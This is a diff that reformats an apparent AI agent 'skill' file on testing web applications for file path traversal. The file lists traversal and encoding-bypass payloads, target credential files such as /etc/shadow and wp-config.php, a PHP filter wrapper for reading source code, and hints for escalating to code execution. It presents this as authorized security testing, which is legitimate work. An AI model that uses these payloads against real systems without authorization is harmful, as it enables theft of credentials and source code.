@@ -1,30 +1,20 @@
 ---
 name: File Path Traversal Testing
-description:
-  This skill should be used when the user asks to "test for directory
-  traversal", "exploit path traversal vulnerabilities", "read arbitrary files
-  through web applications", "find LFI vulnerabilities", or "access files
-  outside web root". It provides comprehensive file path traversal attack and
-  testing methodologies.
+description: This skill should be used when the user asks to "test for directory traversal", "exploit path traversal vulnerabilities", "read arbitrary files through web applications", "find LFI vulnerabilities", or "access files outside web root". It provides comprehensive file path traversal attack and testing methodologies.
 metadata:
   author: zebbern
-  version: '1.1'
+  version: "1.1"
 ---
 
 # File Path Traversal Testing
 
 ## Purpose
 
-Identify and exploit file path traversal (directory traversal) vulnerabilities
-that allow attackers to read arbitrary files on the server, potentially
-including sensitive configuration files, credentials, and source code. This
-vulnerability occurs when user-controllable input is passed to filesystem APIs
-without proper validation.
+Identify and exploit file path traversal (directory traversal) vulnerabilities that allow attackers to read arbitrary files on the server, potentially including sensitive configuration files, credentials, and source code. This vulnerability occurs when user-controllable input is passed to filesystem APIs without proper validation.
 
 ## Prerequisites
 
 ### Required Tools
-
 - Web browser with developer tools
 - Burp Suite or OWASP ZAP
 - cURL for testing payloads
@@ -32,7 +22,6 @@ without proper validation.
 - ffuf or wfuzz for fuzzing
 
 ### Required Knowledge
-
 - HTTP request/response structure
 - Linux and Windows filesystem layout
 - Web application architecture
@@ -61,13 +50,11 @@ include("/home/user/templates/" . $template);
 ```
 
 Attack principle:
-
 - `../` sequence moves up one directory
 - Chain multiple sequences to reach root
 - Access files outside intended directory
 
 Impact:
-
 - **Confidentiality** - Read sensitive files
 - **Integrity** - Write/modify files (in some cases)
 - **Availability** - Delete files (in some cases)
@@ -100,7 +87,6 @@ Map application for potential file operations:
 ```
 
 Common vulnerable functionality:
-
 - Image loading: `/image?filename=23.jpg`
 - Template selection: `?template=blue.php`
 - File downloads: `/download?file=report.pdf`
@@ -434,7 +420,7 @@ def safe_file_access(base_dir, filename):
     # Resolve to absolute path
     base = os.path.realpath(base_dir)
     file_path = os.path.realpath(os.path.join(base, filename))
-
+    
     # Verify file is within base directory
     if file_path.startswith(base):
         return open(file_path, 'r').read()
@@ -446,58 +432,55 @@ def safe_file_access(base_dir, filename):
 
 ### Common Payloads
 
-| Payload                                                  | Target               |
-| -------------------------------------------------------- | -------------------- |
-| `../../../etc/passwd`                                    | Linux password file  |
-| `..\..\..\..\windows\win.ini`                            | Windows INI file     |
-| `....//....//....//etc/passwd`                           | Bypass simple filter |
-| `/etc/passwd`                                            | Absolute path        |
-| `php://filter/convert.base64-encode/resource=config.php` | Source code          |
+| Payload | Target |
+|---------|--------|
+| `../../../etc/passwd` | Linux password file |
+| `..\..\..\..\windows\win.ini` | Windows INI file |
+| `....//....//....//etc/passwd` | Bypass simple filter |
+| `/etc/passwd` | Absolute path |
+| `php://filter/convert.base64-encode/resource=config.php` | Source code |
 
 ### Target Files
 
-| OS      | File                 | Purpose            |
-| ------- | -------------------- | ------------------ |
-| Linux   | `/etc/passwd`        | User accounts      |
-| Linux   | `/etc/shadow`        | Password hashes    |
-| Linux   | `/proc/self/environ` | Environment vars   |
-| Windows | `C:\windows\win.ini` | System config      |
-| Windows | `C:\boot.ini`        | Boot config        |
-| Web     | `wp-config.php`      | WordPress DB creds |
+| OS | File | Purpose |
+|----|------|---------|
+| Linux | `/etc/passwd` | User accounts |
+| Linux | `/etc/shadow` | Password hashes |
+| Linux | `/proc/self/environ` | Environment vars |
+| Windows | `C:\windows\win.ini` | System config |
+| Windows | `C:\boot.ini` | Boot config |
+| Web | `wp-config.php` | WordPress DB creds |
 
 ### Encoding Variants
 
-| Type            | Example                   |
-| --------------- | ------------------------- |
-| URL Encoding    | `%2e%2e%2f` = `../`       |
+| Type | Example |
+|------|---------|
+| URL Encoding | `%2e%2e%2f` = `../` |
 | Double Encoding | `%252e%252e%252f` = `../` |
-| Unicode         | `%c0%af` = `/`            |
-| Null Byte       | `%00`                     |
+| Unicode | `%c0%af` = `/` |
+| Null Byte | `%00` |
 
 ## Constraints and Limitations
 
 ### Permission Restrictions
-
 - Cannot read files application user cannot access
 - Shadow file requires root privileges
 - Many files have restrictive permissions
 
 ### Application Restrictions
-
 - Extension validation may limit file types
 - Base path validation may restrict scope
 - WAF may block common payloads
 
 ### Testing Considerations
-
 - Respect authorized scope
 - Avoid accessing genuinely sensitive data
 - Document all successful access
 
 ## Troubleshooting
 
-| Problem                | Solutions                                                |
-| ---------------------- | -------------------------------------------------------- |
-| No response difference | Try encoding, blind traversal, different files           |
-| Payload blocked        | Use encoding variants, nested sequences, case variations |
+| Problem | Solutions |
+|---------|-----------|
+| No response difference | Try encoding, blind traversal, different files |
+| Payload blocked | Use encoding variants, nested sequences, case variations |
 | Cannot escalate to RCE | Check logs, PHP wrappers, file upload, session poisoning |
